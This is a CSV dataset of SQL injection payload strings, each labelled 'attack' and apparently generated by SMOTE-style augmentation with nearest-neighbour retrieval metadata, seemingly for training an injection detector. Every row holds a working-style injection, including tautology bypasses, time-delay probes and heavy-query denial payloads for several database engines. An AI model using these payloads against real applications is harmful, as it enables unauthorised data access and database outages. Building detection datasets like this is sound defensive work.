id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000277,attack,boolean,"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000704,0.8003592166539799
SMOTE_000278,attack,boolean,"1%'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000850,0.047897850254120876
SMOTE_000279,attack,boolean,"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",nearest_attack_euclidean,R000863,0.3772106001983693
SMOTE_000280,attack,boolean,-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000878,0.010154720084078977
SMOTE_000281,attack,boolean,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw",nearest_attack_euclidean,R001221,0.30318722382822694
SMOTE_000282,attack,boolean,1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,nearest_attack_euclidean,R000342,0.36236145165625505
SMOTE_000283,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",nearest_attack_euclidean,R001557,0.19108203086070757
SMOTE_000284,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001130,0.48776147752971666
SMOTE_000285,attack,boolean,"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000794,0.34124051302625635
SMOTE_000286,attack,boolean,"1%""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001003,1.0213757236467835
SMOTE_000287,attack,boolean,"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000411,1.2621726852039403
SMOTE_000288,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000300,0.1279176299464436
SMOTE_000289,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000432,0.6769365992430462
SMOTE_000290,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000348,0.19950544290997962
SMOTE_000291,attack,boolean,"1' where 8360  =  8360 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001060,0.4009833969062579
SMOTE_000292,attack,boolean,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",nearest_attack_euclidean,R000852,0.21399409761312355
SMOTE_000293,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and '%'  =  '",nearest_attack_euclidean,R001165,0.2950894256816191
SMOTE_000294,attack,boolean," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000033,0.3555487196525115
SMOTE_000295,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",nearest_attack_euclidean,R000585,0.14551243706810543
SMOTE_000296,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""dwbh"" like ""dwbh",nearest_attack_euclidean,R000910,1.6219592289841498
SMOTE_000297,attack,boolean,"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001079,0.05241701786666139
SMOTE_000298,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000403,0.5911073911533414
SMOTE_000299,attack,boolean,"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001491,0.7043073978711565
SMOTE_000300,attack,boolean,"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000358,0.4091676062436424
SMOTE_000301,attack,boolean,"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001270,0.09664485066580565
SMOTE_000302,attack,boolean,"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R001135,0.009729551985073085
SMOTE_000303,attack,boolean,-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,nearest_attack_euclidean,R000404,0.1509899219945322
SMOTE_000304,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000323,1.7106991777163432
SMOTE_000305,attack,boolean,"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R000862,0.3213767465679527
SMOTE_000306,attack,boolean,"1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001072,0.9650144348015613
SMOTE_000307,attack,boolean,"1%"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001315,0.08066147719518174
SMOTE_000308,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",nearest_attack_euclidean,R000390,0.41752803839232916
SMOTE_000309,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001227,0.15972531686402927
SMOTE_000310,attack,boolean,-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000723,0.24522254359391019
SMOTE_000311,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001050,0.09384234996469186
SMOTE_000312,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R001450,0.28329456398438063
SMOTE_000313,attack,boolean,"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001491,0.2156426646797473
SMOTE_000314,attack,boolean,"1""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""ampn"" like ""ampn",nearest_attack_euclidean,R000229,1.1048498048675157
SMOTE_000315,attack,boolean,"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg",nearest_attack_euclidean,R000795,0.694016936382338
SMOTE_000316,attack,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",nearest_attack_euclidean,R000032,0.2295097348046463
SMOTE_000317,attack,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx",nearest_attack_euclidean,R000843,0.20181317910961694
SMOTE_000318,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R001399,0.01638090860785255
SMOTE_000319,attack,boolean,"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu",nearest_attack_euclidean,R000556,0.3094446589302197
SMOTE_000320,attack,boolean,"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000765,0.5870067710036444
SMOTE_000321,attack,boolean,"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001544,1.5681518018765455
SMOTE_000322,attack,boolean,"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000245,0.10979578800448166
SMOTE_000323,attack,boolean,"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001140,0.05103676422177592
SMOTE_000324,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",nearest_attack_euclidean,R000066,0.2443455912738932
SMOTE_000325,attack,boolean,-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R001333,0.043509424183119594
SMOTE_000326,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R001145,1.1944281324161143
SMOTE_000327,attack,boolean,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lwyo'  =  'lwyo",nearest_attack_euclidean,R001478,0.20892302354650766
SMOTE_000328,attack,boolean,"-6534%'   )    )    or make_set  (  4107  =  9457,9457  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000640,0.5531661445791209
SMOTE_000329,attack,boolean,"1   )    )    as vzgo where 6281  =  6281 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001177,0.04926557800481856
SMOTE_000330,attack,boolean,"1' where 8360  =  8360 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R001060,0.2759749052143282
SMOTE_000331,attack,boolean,"-4259'   )    )    as usqu where 5419  =  5419 or elt  (  8325  =  8837,8837  )  --",nearest_attack_euclidean,R001036,0.004099291458995223
SMOTE_000332,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R001435,0.14955526435866104
SMOTE_000333,attack,boolean,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",nearest_attack_euclidean,R000387,1.3255213399511423
SMOTE_000334,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000016,0.814956097601361
SMOTE_000335,attack,boolean,"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001363,0.7969543727774256
SMOTE_000336,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",nearest_attack_euclidean,R001481,0.3808831687596369
SMOTE_000337,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001088,0.09962541476456227
SMOTE_000338,attack,boolean,"1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",nearest_attack_euclidean,R000345,0.981685260568213
SMOTE_000339,attack,boolean,-5229'   )    )    as tkqp where 9253  =  9253 or 9323  =  9323#,nearest_attack_euclidean,R000656,0.7096478029589977
SMOTE_000340,attack,boolean,"1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000771,0.18961277260449677
SMOTE_000341,attack,boolean,1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000275,1.039034528185287
SMOTE_000342,attack,boolean,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",nearest_attack_euclidean,R001411,0.4577202437369281
SMOTE_000343,attack,boolean,"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",nearest_attack_euclidean,R000571,0.8468126810612894
SMOTE_000344,attack,boolean,1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,nearest_attack_euclidean,R000694,0.0396069026727324
SMOTE_000345,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000457,0.4706415858415705
SMOTE_000346,attack,boolean,"1   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001114,0.07009161711520116
SMOTE_000347,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000994,0.19840979429094127
SMOTE_000348,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,nearest_attack_euclidean,R000648,0.0685498499718601
SMOTE_000349,attack,boolean,"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000671,0.37741502129858345
SMOTE_000350,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R000770,0.0025011684607134234
SMOTE_000351,attack,boolean,"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --",nearest_attack_euclidean,R000842,0.4758529704151498
SMOTE_000352,attack,boolean,"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",nearest_attack_euclidean,R000977,0.08026179971687293
SMOTE_000353,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'hmsu'  =  'hmsu",nearest_attack_euclidean,R001481,0.003094859572915837
SMOTE_000354,attack,boolean,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,nearest_attack_euclidean,R000883,0.3750429485810245
SMOTE_000355,attack,boolean,"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000821,1.2499375873328944
SMOTE_000356,attack,boolean,"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R001560,0.27456510234789683
SMOTE_000357,attack,boolean," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000029,0.139495981853043
SMOTE_000358,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",nearest_attack_euclidean,R000066,0.320365010121829
SMOTE_000359,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000071,0.28535961059663684
SMOTE_000360,attack,boolean,"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001380,0.30230472613646137
SMOTE_000361,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  '%'  =  '",nearest_attack_euclidean,R000063,0.5095262008083445
SMOTE_000362,attack,boolean,"1'||  (  select 'ttyt' where 3751  =  3751 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001084,0.5021278625960754
SMOTE_000363,attack,boolean,"1"" where 8379  =  8379 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000208,0.2867742557283286
SMOTE_000364,attack,boolean,"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",nearest_attack_euclidean,R001540,0.15980224546191565
SMOTE_000365,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001163,0.3355442328932182
SMOTE_000366,attack,boolean,"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R000535,0.3985852822582277
SMOTE_000367,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",nearest_attack_euclidean,R000585,0.33759107368420727
SMOTE_000368,attack,boolean,"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",nearest_attack_euclidean,R000624,0.1267137953170074
SMOTE_000369,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000772,0.1334072782932463
SMOTE_000370,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,nearest_attack_euclidean,R001543,0.8575403498006624
SMOTE_000371,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000700,0.20839833152031992
SMOTE_000372,attack,boolean,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000838,0.0977764071025101
SMOTE_000373,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000521,0.34356318328945246
SMOTE_000374,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000529,0.2695947895586946
SMOTE_000375,attack,boolean," select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000044,0.08938944644272404
SMOTE_000376,attack,boolean,"-9978"" or make_set  (  4893  =  9765,9765  )   and ""mhjt""  =  ""mhjt",nearest_attack_euclidean,R000259,0.4843091052261421
SMOTE_000377,attack,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000019,0.720315870671546
SMOTE_000378,attack,boolean,"1'  )   where 7640  =  7640 and make_set  (  8978  =  8594,8594  )  --",nearest_attack_euclidean,R000468,0.018964422132681135
SMOTE_000379,attack,boolean,"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",nearest_attack_euclidean,R001508,0.318489047966064
SMOTE_000380,attack,boolean,"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001033,0.4227159067660771
SMOTE_000381,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",nearest_attack_euclidean,R001148,0.19510211034679914
SMOTE_000382,attack,boolean,"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb",nearest_attack_euclidean,R000410,0.9862727262211175
SMOTE_000383,attack,boolean,"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001055,0.4116560517239753
SMOTE_000384,attack,boolean,"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf",nearest_attack_euclidean,R000833,0.10849597739388832
SMOTE_000385,attack,boolean,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001220,0.09887738834444748
SMOTE_000386,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R001259,0.5468371807432875
SMOTE_000387,attack,boolean,"1  )   as ekgx where 9923  =  9923 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001466,0.6744922724809651
SMOTE_000388,attack,boolean,"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001277,0.29958839058865044
SMOTE_000389,attack,boolean,"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar",nearest_attack_euclidean,R000808,0.5192374868086719
SMOTE_000390,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",nearest_attack_euclidean,R000520,0.7540366353865172
SMOTE_000391,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000415,0.6865600142483737
SMOTE_000392,attack,boolean,"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000272,0.32595426795471877
SMOTE_000393,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001199,0.4214053172614631
SMOTE_000394,attack,boolean,"1   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  5030  =  5030",nearest_attack_euclidean,R000230,0.20125318732944125
SMOTE_000395,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R001179,0.22308253326762115
SMOTE_000396,attack,boolean,"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,nearest_attack_euclidean,R000594,1.1324595437085494
SMOTE_000397,attack,boolean,"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",nearest_attack_euclidean,R000582,0.3167677716297902
SMOTE_000398,attack,boolean,1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,nearest_attack_euclidean,R000342,0.12630517671259364
SMOTE_000399,attack,boolean,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",nearest_attack_euclidean,R001001,0.5902315027100133
SMOTE_000400,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000742,0.03582057654073103
SMOTE_000401,attack,boolean,"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001234,0.4506270943729398
SMOTE_000402,attack,boolean,-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,nearest_attack_euclidean,R000718,0.32088560799816307
SMOTE_000403,attack,boolean,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000310,0.22744283173711408
SMOTE_000404,attack,boolean,"1%'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000479,0.44536019598132454
SMOTE_000405,attack,boolean,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",nearest_attack_euclidean,R000999,0.3371485191891906
SMOTE_000406,attack,boolean,"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",nearest_attack_euclidean,R000115,0.6643856323977427
SMOTE_000407,attack,boolean,"-8686"" where 4532  =  4532 or elt  (  3301  =  9065,9065  )  --",nearest_attack_euclidean,R000747,0.0
SMOTE_000408,attack,boolean,"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000765,0.14171926958322575
SMOTE_000409,attack,boolean,"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R000300,0.035245791441693916
SMOTE_000410,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000150,0.07837795869444866
SMOTE_000411,attack,boolean," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000006,0.0698512553864511
SMOTE_000412,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R001298,0.02795159179298189
SMOTE_000413,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000173,0.1815849395446955
SMOTE_000414,attack,boolean,"1'+  (  select 'lawc' where 1171  =  1171 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001417,0.04988566282282607
